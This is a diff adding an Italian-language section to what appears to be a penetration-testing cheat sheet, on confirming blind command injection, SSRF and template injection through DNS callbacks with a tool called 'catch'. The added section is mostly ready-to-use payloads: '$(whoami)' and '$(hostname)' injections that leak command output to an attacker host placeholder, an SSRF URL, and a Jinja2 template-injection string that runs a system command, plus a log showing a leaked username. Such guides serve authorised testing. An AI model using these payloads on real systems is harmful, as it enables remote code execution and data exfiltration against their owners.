@@ -85,6 +85,39 @@ curl -s 'https://crt.sh/?q=<dominio>&output=json' | jq -r '.[].name_value' | sor
 # subdomainfinder.c99.nl — trova sottodomini da fonti pubbliche
 ```
 
+## OOB con catch
+
+Il DNS è il canale OOB più potente — passa quasi sempre anche con firewall restrittivi.
+
+```bash
+# Avvia il DNS logger
+catch dns on [--port 53]
+
+# Genera un token unico per i tuoi payload
+catch dns token
+#  → Token: a8f3c2
+#  → Payload: $(whoami).a8f3c2.<LHOST>
+```
+
+### Conferma blind RCE/SSRF/SSTI via DNS
+
+```bash
+# Command injection — il subdomain contiene l'output del comando:
+$(whoami).a8f3c2.<LHOST>
+$(hostname).a8f3c2.<LHOST>
+
+# SSRF — forza il target a risolvere il tuo dominio:
+url=http://a8f3c2.<LHOST>/
+
+# SSTI:
+{{config.__class__.__init__.__globals__['os'].popen('nslookup a8f3c2.<LHOST>').read()}}
+```
+
+Nel log di `catch logs dns` vedi:
+```
+A www-data.a8f3c2.<LHOST>  ★ TOKEN a8f3c2
+```
+
 ## Tool consigliati
 
 *Installa con `use <tool>` + `install`*
